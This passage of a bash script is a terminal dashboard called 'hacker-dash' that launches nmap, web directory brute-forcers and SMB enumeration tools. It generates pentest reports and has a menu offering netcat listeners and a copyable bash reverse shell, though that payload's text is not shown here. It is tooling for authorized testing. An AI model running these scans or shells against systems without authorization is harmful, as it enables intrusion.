  [[ -n "$TARGET" ]] && printf -- '- %s\n' "$(cheat_nmap_quick)"
  [[ -n "$TARGET" && -n "$RPORTS" ]] && printf -- '- %s\n' "$(cheat_nmap_rports)"
  if [[ -n "$url" ]]; then
    printf -- '- curl -iL %s\n' "$(quote_shell "$url")"
    printf -- '- %s\n' "$(cheat_gobuster)"
  fi
  printf '\n## Operator notes\n'
  printf -- '- Keep authorization/scope attached to this report before sharing.\n'
  printf -- '- Treat automated output as leads; manually verify findings before reporting.\n'
}

save_report_file() {
  local safe_target stamp path
  safe_target="${TARGET:-target}"
  safe_target="${safe_target//[^A-Za-z0-9._-]/_}"
  stamp="$(date '+%Y%m%d-%H%M%S')"
  mkdir -p reports
  path="reports/${safe_target}-brief-${stamp}.md"
  generate_report > "$path"
  HD_LAST_REPORT_FILE="$PWD/$path"
  printf '%s' "$HD_LAST_REPORT_FILE"
}

menu_header() {
  clear_screen
  printf '%b────────────────────────────────────────────%b\n' "$grey" "$reset"
  printf '  %b%s%b\n' "$bold" "$1" "$reset"
  printf '%b────────────────────────────────────────────%b\n' "$grey" "$reset"
}

recon_menu() {
  local key selected=0 max=3
  while true; do
    menu_header "Recon commands"
    menu_option 0 "$selected" "nmap quick scripts/services"
    menu_option 1 "$selected" "nmap selected RPORTS"
    menu_option 2 "$selected" "nmap all TCP ports"
    menu_option 3 "$selected" "rustscan services"
    menu_help_run
    key="$(read_key)" || return
    if is_back_key "$key"; then return; fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      1) run_nmap_quick; return ;;
      2) run_nmap_rports; return ;;
      3) run_nmap_allports; return ;;
      4) run_rustscan; return ;;
      b|B) return ;;
      q|Q|$'\x03') request_quit; return ;;
      ''|$'\r'|$'\n')
        case "$selected" in
          0) run_nmap_quick; return ;;
          1) run_nmap_rports; return ;;
          2) run_nmap_allports; return ;;
          3) run_rustscan; return ;;
        esac
        ;;
    esac
    [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return
  done
}

web_menu() {
  local key selected=0 max=4
  while true; do
    menu_header "Web commands"
    menu_option 0 "$selected" "whatweb URL"
    menu_option 1 "$selected" "nikto URL"
    menu_option 2 "$selected" "gobuster dir"
    menu_option 3 "$selected" "ffuf dir"
    menu_option 4 "$selected" "feroxbuster dir"
    menu_help_run
    key="$(read_key)" || return
    if is_back_key "$key"; then return; fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      1) run_whatweb; return ;;
      2) run_nikto; return ;;
      3) run_gobuster_dir; return ;;
      4) run_ffuf_dir; return ;;
      5) run_feroxbuster; return ;;
      b|B) return ;;
      q|Q|$'\x03') request_quit; return ;;
      ''|$'\r'|$'\n')
        case "$selected" in
          0) run_whatweb; return ;;
          1) run_nikto; return ;;
          2) run_gobuster_dir; return ;;
          3) run_ffuf_dir; return ;;
          4) run_feroxbuster; return ;;
        esac
        ;;
    esac
    [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return
  done
}

smb_menu() {
  local key selected=0 max=2
  while true; do
    menu_header "SMB commands"
    menu_option 0 "$selected" "smbclient list shares"
    menu_option 1 "$selected" "enum4linux-ng"
    menu_option 2 "$selected" "nmap SMB enum scripts"
    menu_help_run
    key="$(read_key)" || return
    if is_back_key "$key"; then return; fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      1) run_smbclient; return ;;
      2) run_enum4linux; return ;;
      3) run_nmap_smb; return ;;
      b|B) return ;;
      q|Q|$'\x03') request_quit; return ;;
      ''|$'\r'|$'\n')
        case "$selected" in
          0) run_smbclient; return ;;
          1) run_enum4linux; return ;;
          2) run_nmap_smb; return ;;
        esac
        ;;
    esac
    [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return
  done
}

utils_menu() {
  local key selected=0 max=2
  while true; do
    menu_header "Utility commands"
    menu_option 0 "$selected" "ping TARGET"
    menu_option 1 "$selected" "curl headers/body URL"
    menu_option 2 "$selected" "nc connect TARGET:first RPORT"
    menu_help_run
    key="$(read_key)" || return
    if is_back_key "$key"; then return; fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      1) run_ping; return ;;
      2) run_curl_headers; return ;;
      3) run_nc_connect; return ;;
      b|B) return ;;
      q|Q|$'\x03') request_quit; return ;;
      ''|$'\r'|$'\n')
        case "$selected" in
          0) run_ping; return ;;
          1) run_curl_headers; return ;;
          2) run_nc_connect; return ;;
        esac
        ;;
    esac
    [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return
  done
}

smart_menu() {
  local key selected=0 max i action
  local labels=() actions=()
  labels+=("nmap quick scripts/services") actions+=("run_nmap_quick")
  [[ -n "$RPORTS" ]] && { labels+=("nmap selected RPORTS ($RPORTS)"); actions+=("run_nmap_rports"); }
  labels+=("nmap all TCP ports") actions+=("run_nmap_allports")
  if has_web_ports || has_tls_web_ports; then
    labels+=("WEB suggested: whatweb URL") actions+=("run_whatweb")
    labels+=("WEB suggested: gobuster dir") actions+=("run_gobuster_dir")
  fi
  has_smb_ports && { labels+=("SMB suggested: list shares"); actions+=("run_smbclient"); labels+=("SMB suggested: enum4linux-ng"); actions+=("run_enum4linux"); }
  has_ssh_ports && { labels+=("SSH suggested: nmap SSH scripts"); actions+=("run_nmap_ssh"); }
  has_ftp_ports && { labels+=("FTP suggested: nmap FTP scripts"); actions+=("run_nmap_ftp"); }
  max=$((${#labels[@]} - 1))

  while true; do
    menu_header "Smart scans"
    printf '  Services: %s\n' "$(smart_service_summary)"
    printf '  Showing only likely useful commands.\n\n'
    for i in "${!labels[@]}"; do
      menu_option "$i" "$selected" "${labels[$i]}"
    done
    menu_help_run

    key="$(read_key)" || return
    if is_back_key "$key"; then
      return
    fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      b|B) return ;;
      [1-9])
        i=$((key - 1))
        if (( i >= 0 && i <= max )); then
          action="${actions[$i]}"
          "$action"; return
        fi
        ;;
      q|Q|$'\x03') request_quit; return ;;
      ''|$'\r'|$'\n')
        action="${actions[$selected]}"
        "$action"; return
        ;;
    esac
    [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return
  done
}

all_scans_menu() {
  local key selected=0 max i action
  local labels=(
    "nmap quick scripts/services"
    "nmap selected RPORTS"
    "nmap all TCP ports"
    "rustscan services"
    "whatweb URL"
    "nikto URL"
    "gobuster dir"
    "ffuf dir"
    "feroxbuster dir"
    "smbclient list shares"
    "enum4linux-ng"
    "nmap SMB enum scripts"
    "ping TARGET"
    "curl headers/body URL"
    "nc connect TARGET:first RPORT"
  )
  local actions=(
    "run_nmap_quick"
    "run_nmap_rports"
    "run_nmap_allports"
    "run_rustscan"
    "run_whatweb"
    "run_nikto"
    "run_gobuster_dir"
    "run_ffuf_dir"
    "run_feroxbuster"
    "run_smbclient"
    "run_enum4linux"
    "run_nmap_smb"
    "run_ping"
    "run_curl_headers"
    "run_nc_connect"
  )
  max=$((${#labels[@]} - 1))

  while true; do
    menu_header "All scans"
    printf '  Manual mode: every command is shown.\n\n'
    for i in "${!labels[@]}"; do
      menu_option "$i" "$selected" "${labels[$i]}"
    done
    menu_help_run

    key="$(read_key)" || return
    if is_back_key "$key"; then
      return
    fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      b|B) return ;;
      [1-9])
        i=$((key - 1))
        if (( i >= 0 && i <= max )); then
          action="${actions[$i]}"
          "$action"; return
        fi
        ;;
      q|Q|$'\x03') request_quit; return ;;
      ''|$'\r'|$'\n')
        action="${actions[$selected]}"
        "$action"; return
        ;;
    esac
    [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return
  done
}

url_helper_menu() {
  local key selected=0 max=4 web_port tls_port custom
  web_port="$(first_matching_port 80 8080 8000 8008 8081 8888 3000 5000 9000 2>/dev/null)"
  tls_port="$(first_matching_port 443 8443 4443 9443 2>/dev/null)"

  while true; do
    menu_header "URL workspace"
    printf '  TARGET: %s\n  Current URL: %s\n\n' "${TARGET:-<empty>}" "${URL:-<empty>}"
    menu_option 0 "$selected" "Set http://TARGET"
    menu_option 1 "$selected" "Set https://TARGET"
    menu_option 2 "$selected" "Set http://TARGET:${web_port:-8080}"
    menu_option 3 "$selected" "Set https://TARGET:${tls_port:-8443}"
    menu_option 4 "$selected" "Manual URL edit"
    menu_help_choose

    key="$(read_key)" || return
    if is_back_key "$key"; then
      return
    fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      [1-5]) selected=$((key - 1)); key=$'\r' ;;
      b|B) return ;;
      q|Q|$'\x03') request_quit; return ;;
    esac
    case "$key" in
      ''|$'\r'|$'\n')
        if [[ "$selected" -ne 4 && -z "$TARGET" ]]; then
          HD_STATUS="Set TARGET first"
          return 1
        fi
        case "$selected" in
          0) URL="http://$TARGET" ;;
          1) URL="https://$TARGET" ;;
          2) URL="http://$TARGET:${web_port:-8080}" ;;
          3) URL="https://$TARGET:${tls_port:-8443}" ;;
          4)
            clear_screen
            printf '%bManual URL edit%b\n\n' "$bold" "$reset"
            printf 'Example: http://%s:8080\n' "${TARGET:-target}"
            printf 'URL: '
            if ! read_line_or_back custom; then
              HD_STATUS="URL unchanged"
              return
            fi
            [[ -z "$custom" ]] && { HD_STATUS="URL unchanged"; return; }
            URL="$custom"
            ;;
        esac
        save_state; export_vars; notify_parent_shell
        HD_STATUS="Updated URL to $URL"
        return
        ;;
    esac
    [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return
  done
}

copy_snippets_menu() {
  local key selected=0 max=4
  while true; do
    menu_header "Copy-ready snippets"
    menu_option 0 "$selected" "export TARGET/HUNTER/URL/RPORTS"
    menu_option 1 "$selected" "nmap quick scan"
    menu_option 2 "$selected" "nmap selected RPORTS scan"
    menu_option 3 "$selected" "gobuster directory scan"
    menu_option 4 "$selected" "ffuf directory fuzz"
    menu_help_copy

    key="$(read_key)" || return
    if is_back_key "$key"; then
      return
    fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      [1-5]) selected=$((key - 1)); key=$'\r' ;;
      b|B) return ;;
      q|Q|$'\x03') request_quit; return ;;
    esac
    case "$key" in
      ''|$'\r'|$'\n')
        case "$selected" in
          0) copy_text_status "export line" "$(cheat_export_vars)" ;;
          1) require_target && copy_text_status "nmap quick scan" "$(cheat_nmap_quick)" ;;
          2) require_target && require_rports && copy_text_status "nmap RPORTS scan" "$(cheat_nmap_rports)" ;;
          3) require_url && copy_text_status "gobuster directory scan" "$(cheat_gobuster)" ;;
          4) require_url && copy_text_status "ffuf directory fuzz" "$(cheat_ffuf)" ;;
        esac
        return
        ;;
    esac
    [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return
  done
}

shells_menu() {
  local key selected=0 max=4
  while true; do
    menu_header "Shell & listeners"
    printf '  HUNTER/LHOST: %s\n\n' "${HUNTER:-<empty>}"
    menu_option 0 "$selected" "nc listener"
    menu_option 1 "$selected" "rlwrap nc listener"
    menu_option 2 "$selected" "copy bash reverse shell"
    menu_option 3 "$selected" "copy Python PTY upgrade"
    menu_option 4 "$selected" "copy stabilize steps"
    menu_help_choose

    key="$(read_key)" || return
    if is_back_key "$key"; then
      return
    fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      [1-5]) selected=$((key - 1)); key=$'\r' ;;
      b|B) return ;;
      q|Q|$'\x03') request_quit; return ;;
    esac
    case "$key" in
      ''|$'\r'|$'\n')
        case "$selected" in
          0) run_nc_listener; return ;;
          1) run_rlwrap_listener; return ;;
          2) bash_reverse_shell; return ;;
          3) copy_pty_upgrade; return ;;
          4) copy_stabilize_steps; return ;;
        esac
        ;;
    esac
    [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return
  done
}

operator_toolkit_menu() {
  local key selected=0 max=2
  while true; do
    menu_header "Operator toolkit"
    printf '  Professional workspace for shells, dependency checks, and snippets.\n'
    printf '  URL tools live on the URL row: select URL, press e.\n\n'
    menu_option 0 "$selected" "Shell & listeners"
    menu_option 1 "$selected" "Dependency doctor"
    menu_option 2 "$selected" "Copy-ready snippets"
    menu_help_choose
    if [[ -n "$HD_STATUS" ]]; then
      printf '\n  %b%s%b\n' "$grey" "$HD_STATUS" "$reset"
    fi

    key="$(read_key)" || return
    if is_back_key "$key"; then
      return
    fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      [1-3]) selected=$((key - 1)); key=$'\r' ;;
      d|D) doctor_screen ;;
      b|B) return ;;
      q|Q|$'\x03') request_quit; return ;;
    esac
    case "$key" in
      ''|$'\r'|$'\n')
        case "$selected" in
          0) shells_menu ;;
          1) doctor_screen ;;
          2) copy_snippets_menu ;;
        esac
        ;;
    esac
    [[ "$HD_EXIT_AFTER_COMMAND" -eq 1 || "$HD_QUIT_REQUESTED" -eq 1 ]] && return
  done
}

report_menu() {
  local key selected=0 max=2 report_path
  while true; do
    menu_header "Professional report"
    printf '  Target: %s\n' "${TARGET:-<empty>}"
    printf '  Services: %s\n\n' "$(smart_service_summary)"
    menu_option 0 "$selected" "Copy report"
    menu_option 1 "$selected" "Save report to ./reports"
    menu_option 2 "$selected" "Preview compact brief"
    menu_help_choose

    key="$(read_key)" || return
    if is_back_key "$key"; then
      return
    fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      [1-3]) selected=$((key - 1)); key=$'\r' ;;
      b|B) return ;;
      q|Q|$'\x03') request_quit; return ;;
    esac
    case "$key" in
      ''|$'\r'|$'\n')
        case "$selected" in
          0) copy_text_status "professional report" "$(generate_report)"; return ;;
          1) report_path="$(save_report_file)"; HD_STATUS="Saved report: $report_path"; return ;;
          2)
            clear_screen
            printf '%bProfessional Pentest Brief%b\n\n' "$bold" "$reset"
            printf 'Target: %s\nHunter: %s\nURL: %s\nPorts: %s\nServices: %s\n' \
              "${TARGET:-not set}" "${HUNTER:-not set}" "${URL:-not set}" "${RPORTS:-not set}" "$(smart_service_summary)"
            wait_for_back
            [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return
            ;;
        esac
        ;;
    esac
    [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return
  done
}

command_menu() {
  local key selected=0 max=1
  while true; do
    menu_header "Run commands"
    menu_option 0 "$selected" "Smart scans  recommended from RPORTS/services"
    menu_option 1 "$selected" "All scans    show every command"
    menu_help_choose
    if [[ -n "$HD_STATUS" ]]; then
      printf '\n  %b%s%b\n' "$grey" "$HD_STATUS" "$reset"
    fi

    key="$(read_key)" || return
    if is_back_key "$key"; then
      return
    fi
    case "$key" in
      $'\x1b[A'|k|K) (( selected > 0 )) && ((selected--)) ;;
      $'\x1b[B'|j|J) (( selected < max )) && ((selected++)) ;;
      1) smart_menu ;;
      2) all_scans_menu ;;
      b|B) return ;;
      q|Q|$'\x03') request_quit; return ;;
      ''|$'\r'|$'\n')
        case "$selected" in
          0) smart_menu ;;
          1) all_scans_menu ;;
        esac
        ;;
    esac
    [[ "$HD_EXIT_AFTER_COMMAND" -eq 1 || "$HD_QUIT_REQUESTED" -eq 1 ]] && return
  done
}

print_env() {
  load_state
  printf 'export TARGET=%s\n' "$(quote_shell "$TARGET")"
  printf 'export HUNTER=%s\n' "$(quote_shell "$HUNTER")"
  printf 'export URL=%s\n' "$(quote_shell "$URL")"
  printf 'export RPORTS=%s\n' "$(quote_shell "$RPORTS")"
}

usage() {
  cat <<'USAGE'
hacker-dash - minimal pentest dashboard

Usage:
  ./hacker-dash.sh                    # tmux popup when inside tmux, otherwise inline UI
  source ./hacker-dash.sh             # same, and refreshes current shell variables after exit
  ./hacker-dash.sh --no-popup         # force inline UI
  ./hacker-dash.sh --popup            # force tmux popup UI
  ./hacker-dash.sh --print-env        # print export commands
  ./hacker-dash.sh --set VAR VALUE    # set TARGET/HUNTER/URL/RPORTS
  ./hacker-dash.sh --clear            # clear all values
  ./hacker-dash.sh --doctor           # check useful local dependencies
  ./hacker-dash.sh --report           # print a smart pentest brief

Main keys:
  ↑/↓ or j/k  select TARGET/HUNTER/URL/RPORTS
  c           copy selected value and export vars
  e           edit selected value; URL opens URL workspace/manual edit; RPORTS opens add/delete/replace
  r           run command menu; choose with ↑/↓ or j/k, Enter to run
  o           operator toolkit: shells, dependency doctor, copy-ready snippets
  p           professional report menu
  q           quit

Command menu:
  Smart scans  recommended commands from RPORTS/services
  All scans    every scan/utility command in one list

Navigation:
  Press b or Backspace to go back from nested menus
  q quits from any menu

Notes:
  RPORTS is a comma-separated list, e.g. 22,80,443,8080.
  Select RPORTS and press e to replace the list, add one port, or delete one port.
  Commands launch in a separate tmux window when inside tmux.
  Set WORDLIST to override the default web wordlist.
USAGE
}

run_ui() {
  load_state
  export_vars
  HD_EXIT_AFTER_COMMAND=0
  HD_QUIT_REQUESTED=0

  while true; do
    draw_dashboard
    local key
    key="$(read_key)" || return 0

    case "$key" in
      $'\x1b[A'|k|K) (( HD_SELECTED > 0 )) && ((HD_SELECTED--)) ;;
      $'\x1b[B'|j|J) (( HD_SELECTED < 3 )) && ((HD_SELECTED++)) ;;
      c|C) copy_selected ;;
      e|E) edit_selected ;;
      r|R) command_menu; [[ "$HD_EXIT_AFTER_COMMAND" -eq 1 || "$HD_QUIT_REQUESTED" -eq 1 ]] && return 0 ;;
      o|O) operator_toolkit_menu; [[ "$HD_EXIT_AFTER_COMMAND" -eq 1 || "$HD_QUIT_REQUESTED" -eq 1 ]] && return 0 ;;
      p|P) report_menu ;;
      q|Q|$'\x03') clear_screen; return 0 ;;
    esac
    [[ "$HD_QUIT_REQUESTED" -eq 1 ]] && return 0
  done
}

run_popup() {
  if [[ -z "${TMUX:-}" ]] || ! command -v tmux >/dev/null 2>&1; then
    run_ui
    local hd_status=$?
    refresh_env_from_state
    return "$hd_status"
  fi

  local path qpath cmd hd_status
  path="$(script_path)"
  qpath="$(quote_shell "$path")"
  cmd="HACKER_DASH_IN_POPUP=1 HACKER_DASH_NOTIFY_PID=$$ bash $qpath --no-popup"

  tmux display-popup -E -w 64 -h 20 -T " hacker-dash " "$cmd"
  hd_status=$?

  refresh_env_from_state
  return "$hd_status"
}

main() {
  case "${1:-}" in
    --help|-h)
      usage
      return 0
      ;;
    --print-env)
      print_env
      return 0
      ;;
    --doctor)
      doctor_report
      return 0
      ;;
    --report)
      generate_report
      return 0
      ;;
    --set)
      load_state
      case "${2:-}" in
        TARGET) TARGET="${3:-}" ;;
        HUNTER) HUNTER="${3:-}" ;;
        URL) URL="${3:-}" ;;
        RPORTS) RPORTS="${3:-}" ;;
        *) printf 'Usage: %s --set TARGET|HUNTER|URL|RPORTS VALUE\n' "$APP_NAME" >&2; return 2 ;;
      esac
      save_state
      export_vars
      notify_parent_shell
      return 0
      ;;
    --clear)
      TARGET=""
      HUNTER=""
      URL=""
      RPORTS=""
      save_state
      export_vars
      notify_parent_shell
      return 0
      ;;
    --popup)
      run_popup
      return $?
      ;;
    --no-popup)
      run_ui
      local hd_status=$?
      refresh_env_from_state
      return "$hd_status"
      ;;
    *)
      if [[ -n "${TMUX:-}" && -z "${HACKER_DASH_IN_POPUP:-}" ]]; then
        run_popup
      else
        run_ui
        local hd_status=$?
        refresh_env_from_state
        return "$hd_status"
      fi
      ;;
  esac
}

main "$@"
finish $?
